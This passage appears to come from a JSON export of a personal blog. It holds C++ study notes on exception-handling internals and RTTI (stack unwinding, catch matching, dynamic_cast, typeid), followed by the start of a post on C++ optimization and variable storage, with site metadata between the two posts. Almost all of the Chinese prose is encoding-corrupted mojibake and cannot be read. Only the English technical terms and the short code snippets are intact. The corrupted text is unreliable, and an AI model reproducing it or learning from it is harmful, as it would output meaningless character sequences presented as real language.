handlerã€‚å®ƒç”¨æ¥è¡¨ç¤ºè¯´ï¼Œè¿™ä¸ªå­å¥å‡†å¤‡å¤„ç†æŸç§ç±»å‹çš„exceptionï¼Œå¹¶ä¸”åœ¨å°é—­çš„å¤§æ‹¬å·åŒºæ®µä¸­æä¾›å®é™…çš„å¤„ç†ç¨‹åº ä¸€ä¸ªtryåŒºæ®µã€‚å®ƒè¢«å›´ç»•ä»¥ä¸€ç³»åˆ—çš„å™è¿°å¥ï¼ˆstatementsï¼‰ï¼Œè¿™äº›å™è¿°å¥å¯èƒ½ä¼šå¼•å‘catchå­å¥èµ·ä½œç”¨ã€‚ å½“ä¸€ä¸ªexceptionè¢«æŠ›å‡ºå»æ—¶ï¼Œæ§åˆ¶æƒä¼šä»å‡½æ•°è°ƒç”¨ä¸­è¢«é‡Šæ”¾å‡ºæ¥ï¼Œå¹¶å¯»æ‰¾ä¸€ä¸ªå»åˆçš„catchå­å¥ã€‚å¦‚æœéƒ½æ²¡æœ‰å»åˆè€…ï¼Œé‚£ä¹ˆé»˜è®¤çš„å¤„ç†ä¾‹ç¨‹terminate()ä¼šè¢«è°ƒç”¨ã€‚å½“æ§åˆ¶æƒè¢«æ”¾å¼ƒåï¼Œå †æ ˆä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ä¹Ÿå°±è¢«æ¨ç¦»ï¼ˆpopped upï¼‰ã€‚è¿™ä¸ªç¨‹åºç§°ä¸ºunwinding the stackã€‚åœ¨æ¯ä¸€ä¸ªå‡½æ•°è¢«æ¨ç¦»å †æ ˆä¹‹å‰ï¼Œå‡½æ•°çš„local class objectsçš„destructorä¼šè¢«è°ƒç”¨ã€‚ æ”¯æŒEHï¼Œä¼šä½¿é‚£äº›æ‹¥æœ‰member class subobjectsæˆ–base class subobjectsï¼ˆå¹¶ä¸”å®ƒä»¬ä¹Ÿéƒ½æœ‰constructorsï¼‰çš„classesçš„constructoræ›´å¤æ‚ã€‚ä¸€ä¸ªclasså¦‚æœè¢«éƒ¨åˆ†æ„é€ ï¼Œå…¶destructorå¿…é¡»åªæ–½è¡Œäºé‚£äº›å·²è¢«æ„é€ çš„subobjectså’Œï¼ˆæˆ–ï¼‰member objectsèº«ä¸Šã€‚ å¯¹Exception Handlingçš„æ”¯æŒ å½“ä¸€ä¸ªexceptionå‘ç”Ÿæ—¶ï¼Œç¼–è¯‘ç³»ç»Ÿå¿…é¡»å®Œæˆä»¥ä¸‹äº‹æƒ…ï¼š æ£€éªŒå‘ç”Ÿthrowæ“ä½œçš„å‡½æ•°ã€‚ å†³å®šthrowæ“ä½œæ˜¯å¦å‘ç”Ÿåœ¨tryåŒºæ®µä¸­ã€‚ è‹¥æ˜¯ï¼Œç¼–è¯‘ç³»ç»Ÿå¿…é¡»æŠŠexception typeæ‹¿æ¥å’Œæ¯ä¸€ä¸ªcatchå­å¥è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœæ¯”è¾ƒåå»åˆï¼Œæµç¨‹æ§åˆ¶åº”è¯¥äº¤åˆ°catchå­å¥æ‰‹ä¸­ã€‚ å¦‚æœthrowçš„å‘ç”Ÿå¹¶ä¸åœ¨ tryåŒºæ®µä¸­ï¼Œæˆ–æ²¡æœ‰ä¸€ä¸ªcatchå­å¥å»åˆï¼Œé‚£ä¹ˆç³»ç»Ÿå¿…é¡»ï¼ˆaï¼‰æ‘§æ¯æ‰€æœ‰active local objectsï¼Œï¼ˆbï¼‰ä»å †æ ˆä¸­å°†ç›®å‰çš„å‡½æ•°â€œunwindâ€æ‰ï¼Œï¼ˆcï¼‰è¿›è¡Œåˆ°ç¨‹åºå †æ ˆçš„ä¸‹ä¸€ä¸ªå‡½æ•°ä¸­å»ï¼Œç„¶åé‡å¤ä¸Šè¿°æ­¥éª¤ 2ï½5ã€‚ å†³å®šthrowæ˜¯å¦å‘ç”Ÿåœ¨ä¸€ä¸ªtryåŒºæ®µä¸­ è¿˜è®°å¾—å—ï¼Œä¸€ä¸ªå‡½æ•°å¯ä»¥è¢«æƒ³è±¡ä¸ºå¥½å‡ ä¸ªåŒºåŸŸï¼š tryåŒºæ®µä»¥å¤–çš„åŒºåŸŸï¼Œè€Œä¸”æ²¡æœ‰active local objectsã€‚ tryåŒºæ®µä»¥å¤–çš„åŒºåŸŸï¼Œä½†æœ‰ä¸€ä¸ªï¼ˆæˆ–ä»¥ä¸Šï¼‰çš„active local objectséœ€è¦ææ„ã€‚ tryåŒºæ®µä»¥å†…çš„åŒºåŸŸã€‚ ç¼–è¯‘å™¨å¿…é¡»æ ‡ç¤ºå‡ºä»¥ä¸Šå„åŒºåŸŸï¼Œå¹¶ä½¿å®ƒä»¬å¯¹æ‰§è¡ŒæœŸçš„exception handlingç³»ç»Ÿæœ‰æ‰€ä½œç”¨ã€‚ä¸€ä¸ªå¾ˆæ£’çš„ç­–ç•¥å°±æ˜¯æ„é€ å‡ºprogram counter-rangeè¡¨æ ¼ã€‚ å›å¿†ä¸€ä¸‹ï¼Œprogram counterå†…å«ä¸‹ä¸€ä¸ªå³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤ã€‚å¥½ï¼Œä¸ºäº†åœ¨ä¸€ä¸ªå†…å«tryåŒºæ®µçš„å‡½æ•°ä¸­æ ‡ç¤ºå‡ºæŸä¸ªåŒºåŸŸï¼Œå¯ä»¥æŠŠprogram counterçš„èµ·å§‹å€¼å’Œç»“æŸå€¼ï¼ˆæˆ–æ˜¯èµ·å§‹å€¼å’ŒèŒƒå›´ï¼‰å­˜å‚¨åœ¨ä¸€ä¸ªè¡¨æ ¼ä¸­ã€‚ å½“throwæ“ä½œå‘ç”Ÿæ—¶ï¼Œç›®å‰çš„program counterå€¼è¢«æ‹¿æ¥ä¸å¯¹åº”çš„â€œèŒƒå›´è¡¨æ ¼â€è¿›è¡Œæ¯”å¯¹ï¼Œä»¥å†³å®šç›®å‰ä½œç”¨ä¸­çš„åŒºåŸŸæ˜¯å¦åœ¨ä¸€ä¸ªtryåŒºæ®µä¸­ã€‚å¦‚æœæ˜¯ï¼Œå°±éœ€è¦æ‰¾å‡ºç›¸å…³çš„catchå­å¥ã€‚å¦‚æœè¿™ä¸ªexceptionæ— æ³•è¢«å¤„ç†ï¼ˆæˆ–è€…å®ƒè¢«å†æ¬¡æŠ›å‡ºï¼‰ï¼Œç›®å‰çš„è¿™ä¸ªå‡½æ•°ä¼šä»ç¨‹åºå †æ ˆä¸­è¢«æ¨å‡ºï¼ˆpoppedï¼‰ï¼Œè€Œprogram counterä¼šè¢«è®¾å®šä¸ºè°ƒç”¨ç«¯åœ°å€ï¼Œç„¶åè¿™æ ·çš„å¾ªç¯å†é‡æ–°å¼€å§‹ã€‚ å°†exceptionçš„ç±»å‹å’Œæ¯ä¸€ä¸ªcatchå­å¥çš„ç±»å‹åšæ¯”è¾ƒ å¯¹äºæ¯ä¸€ä¸ªè¢«æŠ›å‡ºæ¥çš„exceptionï¼Œç¼–è¯‘å™¨å¿…é¡»äº§ç”Ÿä¸€ä¸ªç±»å‹æè¿°å™¨ï¼Œå¯¹exceptionçš„ç±»å‹è¿›è¡Œç¼–ç ã€‚å¦‚æœé‚£æ˜¯ä¸€ä¸ªderived typeï¼Œç¼–ç å†…å®¹å¿…é¡»åŒ…æ‹¬å…¶æ‰€æœ‰base classçš„ç±»å‹ä¿¡æ¯ã€‚åªç¼–è¿›public base classçš„ç±»å‹æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºè¿™ä¸ªexceptionå¯èƒ½è¢«ä¸€ä¸ªmember functionæ•æ‰ï¼Œè€Œåœ¨ä¸€ä¸ªmember functionçš„èŒƒå›´ï¼ˆscopeï¼‰ä¹‹ä¸­ï¼Œderived classå’Œnonpublic base classä¹‹é—´å¯ä»¥è½¬æ¢ã€‚ ç±»å‹æè¿°å™¨ï¼ˆtype descriptorï¼‰æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºçœŸæ­£çš„exceptionæ˜¯åœ¨æ‰§è¡ŒæœŸè¢«å¤„ç†çš„ï¼Œå…¶objectå¿…é¡»æœ‰è‡ªå·±çš„ç±»å‹ä¿¡æ¯ã€‚RTTIæ­£æ˜¯å› ä¸ºæ”¯æŒEHè€Œè·å¾—çš„å‰¯äº§å“ã€‚ ç¼–è¯‘å™¨è¿˜å¿…é¡»ä¸ºæ¯ä¸€ä¸ªcatchå­å¥äº§ç”Ÿä¸€ä¸ªç±»å‹æè¿°å™¨ã€‚æ‰§è¡ŒæœŸçš„exception handlerä¼šå°†â€œè¢«æŠ›å‡ºä¹‹objectçš„ç±»å‹æè¿°å™¨â€å’Œâ€œæ¯ä¸€ä¸ªcatchå­å¥çš„ç±»å‹æè¿°å™¨â€è¿›è¡Œæ¯”è¾ƒï¼Œç›´åˆ°æ‰¾åˆ°å»åˆçš„ä¸€ä¸ªï¼Œæˆ–æ˜¯ç›´åˆ°å †æ ˆå·²ç»è¢« â€œunwindâ€ è€Œ terminate()å·²è¢«è°ƒç”¨ã€‚ æ¯ä¸€ä¸ªå‡½æ•°ä¼šäº§ç”Ÿå‡ºä¸€ä¸ªexceptionè¡¨æ ¼ï¼Œå®ƒæè¿°ä¸å‡½æ•°ç›¸å…³çš„å„åŒºåŸŸã€ä»»ä½•å¿…è¦çš„å–„åå¤„ç†ä»£ç ï¼ˆcleanup codeï¼Œè¢«local class object destructorsè°ƒç”¨ï¼‰ä»¥åŠcatchå­å¥çš„ä½ç½®ï¼ˆå¦‚æœæŸä¸ªåŒºåŸŸæ˜¯åœ¨tryåŒºæ®µä¹‹ä¸­çš„è¯ï¼‰ã€‚ å½“ä¸€ä¸ªå®é™…å¯¹è±¡åœ¨ç¨‹åºæ‰§è¡Œæ—¶è¢«æŠ›å‡ºï¼Œä¼šå‘ç”Ÿä»€ä¹ˆäº‹ï¼Ÿ å½“ä¸€ä¸ªexceptionè¢«æŠ›å‡ºæ—¶ï¼Œexception objectä¼šè¢«äº§ç”Ÿå‡ºæ¥å¹¶é€šå¸¸æ”¾ç½®åœ¨ç›¸åŒå½¢å¼çš„exceptionæ•°æ®å †æ ˆä¸­ã€‚ä»throwç«¯ä¼ ç»™catchå­å¥çš„ï¼Œæ˜¯exception objectçš„åœ°å€ã€ç±»å‹æè¿°å™¨ï¼ˆæˆ–æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¯¥å‡½æ•°ä¼šä¼ å›ä¸è¯¥exception typeæœ‰å…³çš„ç±»å‹æè¿°å™¨å¯¹è±¡ï¼‰ä»¥åŠå¯èƒ½ä¼šæœ‰çš„ exception object æè¿°å™¨ï¼ˆå¦‚æœæœ‰äººå®šä¹‰å®ƒçš„è¯ï¼‰ã€‚ å¼‚å¸¸ä¸å†…å­˜ å¼‚å¸¸æŠ›å‡ºæœ‰å¯èƒ½å¸¦æ¥ä¸€äº›é—®é¢˜ï¼Œæ¯”æ–¹åœ¨ä¸€å—å†…å­˜çš„lockå’Œunlockå†…å­˜ä¹‹é—´ï¼Œæˆ–æ˜¯åœ¨newå’Œdeleteä¹‹é—´çš„ä»£ç æŠ›å‡ºäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆå°†å¯¼è‡´æœ¬è¯¥è¿›è¡Œçš„unlockæˆ–deleteæ“ä½œä¸èƒ½è¿›è¡Œã€‚ åœ¨å‡½æ•°è¢«å‡ºæ ˆä¹‹å‰ï¼Œå…ˆæˆªä½å¼‚å¸¸ï¼Œåœ¨unlockå’Œdeleteä¹‹åå†å°†å¼‚å¸¸åŸæ ·æŠ›å‡ºã€‚new expressionçš„è°ƒç”¨ä¸ç”¨åŒ…æ‹¬åœ¨tryå—ä¹‹å†…æ˜¯å› ä¸ºï¼Œä¸è®ºåœ¨new operatorè°ƒç”¨æ—¶è¿˜æ˜¯æ„é€ å‡½æ•°è°ƒç”¨æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œéƒ½ä¼šåœ¨æŠ›å‡ºå¼‚å¸¸ä¹‹å‰é‡Šæ”¾å·²åˆ†é…å¥½çš„èµ„æºï¼Œæ‰€ä»¥ä¸ç”¨å†è°ƒç”¨delete ã€‚ å¦ä¸€ä¸ªåŠæ³•æ˜¯ï¼Œå°†è¿™äº›èµ„æºç®¡ç†çš„é—®é¢˜ï¼Œå°è£…åœ¨ä¸€ä¸ªç±»å¯¹è±¡ä¸­ï¼Œç”±ææ„å‡½æ•°é‡Šæ”¾èµ„æºï¼Œè¿™æ ·å°±ä¸éœ€è¦å¯¹ä»£ç è¿›è¡Œä¸Šé¢é‚£æ ·çš„å¤„ç†â€”â€”åˆ©ç”¨å‡½æ•°é‡Šæ”¾æ§åˆ¶æƒä¹‹å‰ä¼šææ„æ‰€æœ‰å±€éƒ¨å¯¹è±¡çš„åŸç†ã€‚ åŒæ ·çš„é“ç†ï¼Œé€‚ç”¨äºæ•°ç»„èº«ä¸Šï¼Œå¦‚æœåœ¨è°ƒç”¨æ„é€ å‡½æ•°è¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œé‚£ä¹ˆä¹‹å‰æ‰€æœ‰è¢«æ„é€ å¥½çš„å…ƒç´ çš„ææ„å‡½æ•°è¢«è°ƒç”¨ï¼Œå¯¹äºæŠ›å‡ºå¼‚å¸¸çš„è¯¥å…ƒç´ ï¼Œåˆ™éµå¾ªå…³äºå•ä¸ªå¯¹è±¡æ„é€ çš„åŸåˆ™ï¼Œç„¶åé‡Šæ”¾å·²ç»åˆ†é…å¥½çš„å†…å­˜ã€‚ 12345678910111213141516void mumble( void *arena ) &#123; Point *p; p = new Point; try &#123; smLock( arena ); // ... &#125; catch ( ... ) &#123; smUnLock( arena ); delete p; throw; &#125; smUnLock( arena ); delete p; &#125; 7.3 æ‰§è¡ŒæœŸç±»å‹è¯†åˆ«ï¼ˆRuntime Type Identificationï¼ŒRTTIï¼‰ Type-Safe Downcastï¼ˆä¿è¯å®‰å…¨çš„å‘ä¸‹è½¬æ¢æ“ä½œï¼‰ ä¸€ä¸ªtype-safe downcastå¿…é¡»åœ¨æ‰§è¡ŒæœŸå¯¹æŒ‡é’ˆæœ‰æ‰€æŸ¥è¯¢ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦æŒ‡å‘å®ƒæ‰€å±•ç°ï¼ˆè¡¨è¾¾ï¼‰ä¹‹objectçš„çœŸæ­£ç±»å‹ã€‚å› æ­¤ï¼Œæ¬²æ”¯æŒtype-safe downcastï¼Œåœ¨objectç©ºé—´å’Œæ‰§è¡Œæ—¶é—´ä¸Šéƒ½éœ€è¦ä¸€äº›é¢å¤–è´Ÿæ‹…ï¼š éœ€è¦é¢å¤–çš„ç©ºé—´ä»¥å­˜å‚¨ç±»å‹ä¿¡æ¯ï¼ˆtype informationï¼‰ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘æŸä¸ªç±»å‹ä¿¡æ¯èŠ‚ç‚¹ã€‚ éœ€è¦é¢å¤–çš„æ—¶é—´ä»¥å†³å®šæ‰§è¡ŒæœŸçš„ç±»å‹ï¼ˆruntime typeï¼‰ï¼Œå› ä¸ºï¼Œæ­£å¦‚å…¶åæ‰€ç¤ºï¼Œè¿™éœ€è¦åœ¨æ‰§è¡ŒæœŸæ‰èƒ½å†³å®šã€‚ C++çš„RTTIæœºåˆ¶æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„downcastè®¾å¤‡ï¼Œä½†åªå¯¹é‚£äº›å±•ç°â€œå¤šæ€ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨ç»§æ‰¿å’ŒåŠ¨æ€ç»‘å®šï¼‰â€çš„ç±»å‹æœ‰æ•ˆã€‚ åœ¨C++ä¸­ï¼Œä¸€ä¸ªå…·å¤‡å¤šæ€æ€§è´¨çš„classï¼ˆæ‰€è°“çš„polymorphic classï¼‰ï¼Œæ­£æ˜¯å†…å«ç€ç»§æ‰¿è€Œæ¥ï¼ˆæˆ–ç›´æ¥å£°æ˜ï¼‰çš„virtual functionsã€‚ ä»ç¼–è¯‘å™¨çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªç­–ç•¥è¿˜æœ‰å…¶ä»–ä¼˜ç‚¹ï¼Œå°±æ˜¯å¤§é‡é™ä½é¢å¤–è´Ÿæ‹…ã€‚æ‰€æœ‰polymorphic classesçš„objectséƒ½ç»´æŠ¤äº†ä¸€ä¸ªæŒ‡é’ˆï¼ˆvptrï¼‰ï¼ŒæŒ‡å‘virtual function tableã€‚åªè¦æˆ‘ä»¬æŠŠä¸è¯¥classç›¸å…³çš„RTTI object åœ°å€æ”¾è¿›virtual table ä¸­ï¼ˆé€šå¸¸æ”¾åœ¨ç¬¬ä¸€ä¸ªslotï¼‰ï¼Œé‚£ä¹ˆé¢å¤–è´Ÿæ‹…å°±é™ä½ä¸ºï¼šæ¯ä¸€ä¸ªclass objectåªå¤šèŠ±è´¹ä¸€ä¸ªæŒ‡é’ˆã€‚è¿™ä¸€æŒ‡é’ˆåªéœ€è¢«è®¾å®šä¸€æ¬¡ï¼Œå®ƒæ˜¯è¢«ç¼–è¯‘å™¨é™æ€è®¾å®šçš„ï¼Œè€Œéåœ¨æ‰§è¡ŒæœŸç”± class constructorè®¾å®šã€‚ Type-Safe Dynamic Castï¼ˆä¿è¯å®‰å…¨çš„åŠ¨æ€è½¬æ¢ï¼‰ dynamic_castè¿ç®—ç¬¦å¯ä»¥åœ¨æ‰§è¡ŒæœŸå†³å®šçœŸæ­£çš„ç±»å‹ã€‚å¦‚æœdowncastæ˜¯å®‰å…¨çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœbase type pointeræŒ‡å‘ä¸€ä¸ªderived class objectï¼‰ï¼Œè¿™ä¸ªè¿ç®—ç¬¦ä¼šä¼ å›è¢«é€‚å½“è½¬æ¢è¿‡çš„æŒ‡é’ˆã€‚å¦‚æœdowncastä¸æ˜¯å®‰å…¨çš„ï¼Œè¿™ä¸ªè¿ç®—ç¬¦ä¼šä¼ å›0ã€‚ ä»€ä¹ˆæ˜¯dynamic_castçš„çœŸæ­£æˆæœ¬å‘¢ï¼Ÿpfctçš„ä¸€ä¸ªç±»å‹æè¿°å™¨ä¼šè¢«ç¼–è¯‘å™¨äº§ç”Ÿå‡ºæ¥ã€‚ç”±ptæ‰€æŒ‡å‘çš„class objectç±»å‹æè¿°å™¨å¿…é¡»åœ¨æ‰§è¡ŒæœŸé€šè¿‡vptrå–å¾—ã€‚type_infoæ˜¯C++Standardæ‰€å®šä¹‰çš„ç±»å‹æè¿°å™¨çš„classåç§°ï¼Œè¯¥classä¸­æ”¾ç½®ç€å¾…ç´¢æ±‚çš„ç±»å‹ä¿¡æ¯ã€‚virtual tableçš„ç¬¬ä¸€ä¸ªslotå†…å«type_info object çš„åœ°å€ï¼›æ­¤type_info objectä¸ptæ‰€æŒ‡çš„class typeæœ‰å…³ã€‚è¿™ä¸¤ä¸ªç±»å‹æè¿°å™¨è¢«äº¤ç»™ä¸€ä¸ªruntime libraryå‡½æ•°ï¼Œæ¯”è¾ƒä¹‹åå‘Šè¯‰æˆ‘ä»¬æ˜¯å¦å»åˆã€‚ Referencesä¸åŒäºPointers ç¨‹åºæ‰§è¡Œä¸­å¯¹ä¸€ä¸ªclassæŒ‡é’ˆç±»å‹æ–½ä»¥dynamic_cast è¿ç®—ç¬¦ï¼š å¦‚æœä¼ å›çœŸæ­£çš„åœ°å€ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸€objectçš„åŠ¨æ€ç±»å‹è¢«ç¡®è®¤äº†ï¼Œä¸€äº›ä¸ç±»å‹æœ‰å…³çš„æ“ä½œç°åœ¨å¯ä»¥æ–½è¡Œäºå…¶ä¸Šã€‚ å¦‚æœä¼ å›0ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰æŒ‡å‘ä»»ä½•objectï¼Œæ„å‘³ç€åº”è¯¥ä»¥å¦ä¸€ç§é€»è¾‘æ–½è¡Œäºè¿™ä¸ªåŠ¨æ€ç±»å‹æœªç¡®å®šçš„objectèº«ä¸Šã€‚ å› æ­¤å½“dynamic_castè¿ç®—ç¬¦æ–½è¡Œäºä¸€ä¸ªreference æ—¶ï¼Œä¼šå‘ç”Ÿä¸‹åˆ—äº‹æƒ…ï¼š å¦‚æœreferenceçœŸæ­£caståˆ°é€‚å½“çš„derived classï¼Œdowncastä¼šè¢«æ‰§è¡Œè€Œç¨‹åºå¯ä»¥ç»§ç»­è¿›è¡Œã€‚ å¦‚æœreferenceå¹¶ä¸çœŸæ­£æ˜¯æŸä¸€ç§derived classï¼Œé‚£ä¹ˆï¼Œç”±äºä¸èƒ½å¤Ÿä¼ å›0ï¼Œå› æ­¤æŠ›å‡ºä¸€ä¸ª bad_cast exceptionã€‚ åŸå› åœ¨äºæŒ‡é’ˆå¯ä»¥è¢«èµ‹å€¼ä¸º0ï¼Œä»¥è¡¨ç¤º no objectï¼Œä½†æ˜¯å¼•ç”¨ä¸è¡Œã€‚ Typeidè¿ç®—ç¬¦ ä½¿ç”¨ typeid è¿ç®—ç¬¦ï¼Œå°±æœ‰å¯èƒ½ä»¥ä¸€ä¸ªreferenceè¾¾åˆ°ç›¸åŒçš„æ‰§è¡ŒæœŸæ›¿ä»£è·¯çº¿ï¼ˆruntimeâ€œalternative pathwayâ€ï¼‰ã€‚typeidè¿ç®—ç¬¦ä¼ å›ä¸€ä¸ªconst referenceï¼Œç±»å‹ä¸ºtype_infoã€‚å¦‚æœä¸¤ä¸ªtype_info objectsç›¸ç­‰ï¼Œè¿™ä¸ªequalityè¿ç®—ç¬¦å°±ä¼ å›trueã€‚ typeid å¯ä»¥è¿”å›const type_info&amp;ï¼Œç”¨ä»¥è·å–ç±»å‹ä¿¡æ¯ã€‚ è™½ç„¶RTTIåªæ”¯æŒå¤šæ€ç±»ï¼Œä½†typeidå’Œtype_infoåŒæ ·å¯ç”¨äºå†…å»ºç±»å‹åŠæ‰€æœ‰éå¤šæ€ç±»ã€‚ä¸å¤šæ€ç±»çš„å·®åˆ«åœ¨äºï¼Œéå¤šæ€ç±»çš„type_infoå¯¹è±¡æ˜¯é™æ€å–å¾—ï¼Œè€Œå¤šæ€ç±»çš„æ˜¯åœ¨æ‰§è¡ŒæœŸè·å¾—ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"optimizing software in cpp","slug":"optimizing-software-in-cpp","date":"2022-06-21T13:14:38.000Z","updated":"2024-01-09T10:23:26.744Z","comments":true,"path":"posts/2ebe459a.html","link":"","permalink":"https://racleray.github.io/posts/2ebe459a.html","excerpt":"optimizing software in cpp è¯»ä¹¦ç¬”è®°","text":"Optimizing in C++ 1 ä¸åŒçš„å˜é‡å­˜å‚¨ä½ç½® stack å‡½æ•°ä¸­çš„ä¸´æ—¶å˜é‡æˆ–å¯¹è±¡ä¸€èˆ¬å­˜å‚¨åœ¨å†…å­˜ç©ºé—´ä¸­çš„stackåŒºã€‚æ¯å½“è°ƒç”¨å‡½æ•°æ—¶ï¼Œå‚æ•°å’Œä¸´æ—¶å˜é‡è¿›æ ˆï¼Œå½“å‡½æ•°è¿”å›æ—¶ï¼Œå‚æ•°å’Œä¸´æ—¶å˜é‡å‡ºæ ˆã€‚æ ˆæ˜¯å†…å­˜ç©ºé—´ä¸­æœ€é«˜æ•ˆçš„å­˜å‚¨æ–¹å¼ã€‚å½“ä¸´æ—¶å˜é‡ä¸­æ²¡æœ‰è¾ƒå¤§å¯¹è±¡æ—¶ï¼Œè®¿é—®æ ˆä¸Šçš„ä¸´æ—¶å˜é‡ä¹ŸåŸºæœ¬èƒ½ç”¨ä¸ŠL1 data cacheã€‚ global or static åœ¨å‡½æ•°ä½“ä¹‹å¤–å£°æ˜çš„å˜é‡ç§°ä¹‹ä¸ºglobalå˜é‡ï¼Œå¯è¢«ä»»ä½•å‡½æ•°è®¿é—®ã€‚è¢«staticä¿®é¥°çš„å˜é‡ç§°ä¸ºstaticå˜é‡ã€‚ globalå’Œstaticå˜é‡åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¼šè¢«æ”¾ç½®äºå†…å­˜ç©ºé—´ä¸­çš„é™æ€æ•°æ®åŒºã€‚ é™æ€æ•°æ®åŒºåŸŸåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š ä¸€éƒ¨åˆ†å­˜å‚¨ const ç±»å‹çš„ global/static å˜é‡ ä¸€éƒ¨åˆ†å­˜å‚¨å·²è¢«åˆå§‹åŒ–çš„ global/static å˜é‡ï¼Œ æœ€åä¸€éƒ¨åˆ†å­˜å‚¨æœªè¢«åˆå§‹åŒ–çš„ global/static å˜é‡ã€‚ ä½¿ç”¨é™æ€æ•°æ®åŒºçš„å¥½å¤„æ˜¯ï¼Œglobal/static å˜é‡åœ¨ç¨‹åºå¯åŠ¨å‰å°±æœ‰ä¸“é—¨çš„å­˜å‚¨ä½ç½®ï¼Œåå¤„æ˜¯åœ¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œè¿™äº›å­˜å‚¨ä½ç½®å°†è¢«ä¸€ç›´å æ®ï¼Œå¯èƒ½ä¼šé™ä½ data cache çš„æ•ˆç‡ã€‚ æ‰€ä»¥å»ºè®®å°½é‡ä¸è¦ä½¿ç”¨globalå˜é‡ã€‚ register registerå˜é‡å­˜å‚¨åœ¨CPUå¯„å­˜å™¨ä¸­ï¼Œå‡½æ•°ä¸­çš„ä¸´æ—¶å˜é‡ç‰¹åˆ«é€‚åˆæ”¾åˆ°registerä¸­ã€‚ä¼˜ç‚¹å¾ˆæ˜æ˜¾ï¼Œè®¿é—® register å˜é‡æ¯”è®¿é—®RAMå¿«å¾—å¤šã€‚ä½†æ˜¯CPUå¯„å­˜å™¨å¤§å°æ˜¯éå¸¸æœ‰é™çš„ï¼Œåœ¨64ä½x86æ¶æ„ä¸­ï¼Œæœ‰14ä¸ªæ•´æ•°å¯„å­˜å™¨ï¼Œ16ä¸ªæµ®ç‚¹å¯„å­˜å™¨ã€‚ volatile volatile ç”¨äºå£°æ˜ä¸€ä¸ªå˜é‡å¯è¢«å…¶ä»–çº¿ç¨‹æ”¹å˜ï¼Œé˜»æ­¢ç¼–è¯‘å™¨ä¾èµ–å˜é‡å…ˆå‰ç¼“å­˜çš„å€¼æ¥è¿›è¡Œä¼˜åŒ– ã€‚ 123456789volatile int seconds; // incremented every second by another threadvoid DelayFiveSeconds()&#123; seconds = 0; while (seconds &lt; 5) &#123; // do nothing while seconds count to 5 &#125;&#125; ä¸Šé¢çš„ä»£ç å¦‚æœä¸å£°æ˜ä¸º volatile, ç¼–è¯‘å™¨å°†ä»»åŠ¡whileæ¡ä»¶ä¸€ç›´æˆç«‹ï¼Œå³ä½¿åˆ«çš„çº¿ç¨‹ä¸­æ”¹å˜äº†secondsçš„å€¼ã€‚ thread-local å¤§å¤šæ•°ç¼–è¯‘å™¨å¯ä»¥ä½¿ç”¨å…³é”®å­— __thread æˆ– __declspec(thread) æ¥å®ç°é™æ€å˜é‡å’Œå…¨å±€å˜é‡çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ã€‚è¿™æ ·çš„å˜é‡åœ¨æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå®ä¾‹ ã€‚ çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ˜¯ä½æ•ˆçš„ï¼Œå› ä¸ºå®ƒæ˜¯é€šè¿‡å­˜å‚¨åœ¨çº¿ç¨‹è®¿é—®å—ä¸­çš„æŒ‡é’ˆè¿›è¡Œè®¿é—®çš„ã€‚å› æ­¤å»ºè®®å°½é‡é¿å…çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œä»£ä¹‹ä»¥stackå­˜å‚¨ã€‚ dynamic memory allocation c++ä¸­é€šè¿‡new/mallocåŠ¨æ€åˆ†é…å­˜å‚¨ï¼Œé€šè¿‡delete/freeé‡Šæ”¾åŠ¨æ€åˆ†é…çš„çš„å­˜å‚¨ï¼ŒåŠ¨æ€åˆ†é…çš„å­˜å‚¨æ”¾åœ¨å†…å­˜ç©ºé—´çš„heapåŒºä¸­ã€‚ ä¼˜ç‚¹ï¼šä½¿ç”¨ç›¸å¯¹stackå­˜å‚¨æ›´åŠ çµæ´» ç¼ºç‚¹ï¼šåŠ¨æ€åˆ†é…å’Œé‡Šæ”¾å¾ˆè€—æ—¶ï¼Œå®¹æ˜“å‡ºç°é‡æŒ‡é’ˆã€æ‚¬å‚æŒ‡é’ˆã€å†…å­˜æ³„éœ²ã€å†…å­˜ç¢ç‰‡ç­‰é—®é¢˜ã€‚ variables declared inside a class ç±»ä¸­å£°æ˜çš„å˜é‡æŒ‰ç…§åœ¨ç±»ä¸­çš„é¡ºåºå­˜å‚¨ï¼Œå­˜å‚¨ä½ç½®ç”±ç±»çš„å¯¹è±¡åœ¨å“ªé‡Œå®šä¹‰çš„å†³å®šã€‚staticä¿®é¥°çš„ç±»æˆå‘˜å˜é‡å°†å­˜å‚¨åœ¨é™æ€æ•°æ®åŒºï¼Œåªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚ å°†å˜é‡å­˜å‚¨åœ¨ç±»ä¸­çš„å¥½å¤„æ˜¯ä¿è¯äº†ç©ºé—´å±€éƒ¨æ€§ï¼Œå¯¹CPU data cacheæ›´å‹å¥½ã€‚ 2 æ•´å‹å˜é‡å’Œè¿ç®—ç¬¦ 